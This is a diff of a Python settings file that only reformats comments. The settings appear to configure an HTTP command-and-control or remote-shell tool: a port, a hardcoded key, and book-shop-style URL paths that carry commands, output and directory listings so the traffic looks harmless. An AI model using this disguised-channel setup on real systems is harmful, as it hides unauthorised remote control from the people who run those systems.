@@ -6,17 +6,17 @@ PORT = 82
 # key use in Encryption/Decryption & This key must be 32 or fewer characters
 KEY = "U can't touch this!"
 
-#Path to use signifying a command request from a client using HTTP GET
+# Path to use signifying a command request from a client using HTTP GET
 CMD_REQUEST = "/book?isbn="
 
-#Path to use signifying a command output from a client using HTTP GET
+# Path to use signifying a command output from a client using HTTP GET
 RESPONSE = "/inventory"
 
-#Path to use signifying current directory from a client using HTTP GET
+# Path to use signifying current directory from a client using HTTP GET
 CWD_RESPONSE = "/title"
 
 
-#Post variable name to user for assigning to command output from a client
+# Post variable name to user for assigning to command output from a client
 RESPONSE_KEY = "index"
 
 
